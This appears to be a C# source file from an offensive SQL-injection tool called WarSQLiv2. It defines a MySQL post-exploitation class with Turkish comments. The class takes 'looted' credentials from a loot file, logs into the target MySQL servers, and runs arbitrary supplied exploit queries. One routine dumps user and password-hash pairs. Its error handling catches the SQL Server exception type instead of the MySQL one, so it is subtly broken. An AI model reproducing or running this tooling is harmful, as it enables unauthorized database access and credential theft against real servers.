using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using MySql.Data.MySqlClient;
using WarSQLiv2.Exploitation.Control;

namespace WarSQLiv2.Exploitation.PostExploitation
{
    class MySqlPostExploitation
    {
        private string _exception;
        private string _exploitResult;
        private string _exploitCode;
        /// <summary>
        /// Fırlatılan Exception'ı yakalayıp kullanıcıya göstermek için kullanılacak
        /// </summary>
        public string Exception
        {
            get { return _exception; }
            set
            {
                _exception = string.Empty;
                _exception = value;
            }
        }

        public string ExploitCode { get; set; }
        public string ExploitResult
        {
            get { return _exploitResult; }
        }

        /// <summary>
        /// Seçilen Listbox item'ını SelectedItem değerine mutlaka set etmemiz gerekir. Bu değer lstLooted'ın selectedItems'ının değeri olmalıdır.
        /// </summary>
        public string SelectedItem { get; set; }

        public List<string> LootedList { get; set; }
        public void ExploitMySql()
        {
            LootedControl();
            var changeLang = new LanguageControl();
            changeLang.FindLang();
            if (!string.IsNullOrEmpty(SelectedItem))
            {
                var split = SelectedItem.Split(':');
                var server = split[0];
                var user = split[2];
                var pass = split[3];
                var con = new MySqlConnectionStringBuilder() { Server = server, UserID = user, Password = pass };
                var mysqlConn = new MySqlConnection(con.ToString());
                try
                {
                    var cmd = new MySqlCommand(ExploitCode, mysqlConn);
                    mysqlConn.Open();
                    var rdr = cmd.ExecuteReader();
                    _exploitResult = string.Empty;
                    while (rdr.Read())
                    {
                        _exploitResult += $"{Environment.NewLine}{rdr[1]}";
                    }
                    rdr.Close();
                    mysqlConn.Close();
                }
                catch (SqlException exp)
                {
                    Exception = string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, changeLang.SelectedLanguage.GetString("GeneralError1"), changeLang.SelectedLanguage.GetString("GeneralError2"));
                }
            }
            else
            {
                Exception = $"{Environment.NewLine}{changeLang.SelectedLanguage.GetString("MessageExploitError1")}";
            }
        }
        public void MySqlHashDump()
        {
            LootedControl();
            var changeLang = new LanguageControl();
            changeLang.FindLang();
            if (!string.IsNullOrEmpty(SelectedItem))
            {
                var split = SelectedItem.Split(':');
                var server = split[0];
                var user = split[2];
                var pass = split[3];
                var con = new MySqlConnectionStringBuilder() { Server = server, UserID = user, Password = pass };
                var mysqlConn = new MySqlConnection(con.ToString());
                try
                {
                    var cmd = new MySqlCommand(ExploitCode, mysqlConn);
                    mysqlConn.Open();
                    var rdr = cmd.ExecuteReader();
                    _exploitResult = string.Empty;
                    while (rdr.Read())
                    {
                        _exploitResult += $"{Environment.NewLine}{rdr[1]}:{rdr[2]}";
                    }
                    rdr.Close();
                    mysqlConn.Close();
                }
                catch (SqlException exp)
                {
                    Exception = string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, changeLang.SelectedLanguage.GetString("GeneralError1"), changeLang.SelectedLanguage.GetString("GeneralError2"));
                }
            }
            else
            {
                Exception = $"{Environment.NewLine}{changeLang.SelectedLanguage.GetString("MessageExploitError1")}";
            }
        }
        private void LootedControl()
        {
            var lootedFileControl = new LootedFileControl();
            try
            {
                lootedFileControl.FileControl();
                var lootedList = lootedFileControl.LootedList;
                foreach (var t in lootedList)
                {
                    LootedList.Add(t);
                }
            }
            catch (Exception exp)
            {
                Exception = lootedFileControl.Exception;
            }
        }
        public void GeneralExploiting()
        {
            LootedControl();
            var changeLang = new LanguageControl();
            changeLang.FindLang();
            if (!string.IsNullOrEmpty(SelectedItem))
            {
                var split = SelectedItem.Split(':');
                var server = split[0];
                var user = split[2];
                var pass = split[3];
                var con = new MySqlConnectionStringBuilder() { Server = server, UserID = user, Password = pass };
                var mysqlConn = new MySqlConnection(con.ToString());
                try
                {
                    var cmd = new MySqlCommand(ExploitCode, mysqlConn);
                    mysqlConn.Open();
                    var rdr = cmd.ExecuteReader();
                    _exploitResult = string.Empty;
                    while (rdr.Read())
                    {
                        _exploitResult += $"{Environment.NewLine}{rdr[0]}";
                    }
                    rdr.Close();
                    mysqlConn.Close();
                }
                catch (SqlException exp)
                {
                    Exception = string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, changeLang.SelectedLanguage.GetString("GeneralError1"), changeLang.SelectedLanguage.GetString("GeneralError2"));
                }
            }
            else
            {
                Exception = $"{Environment.NewLine}{changeLang.SelectedLanguage.GetString("MessageExploitError1")}";
            }
        }
    }
}
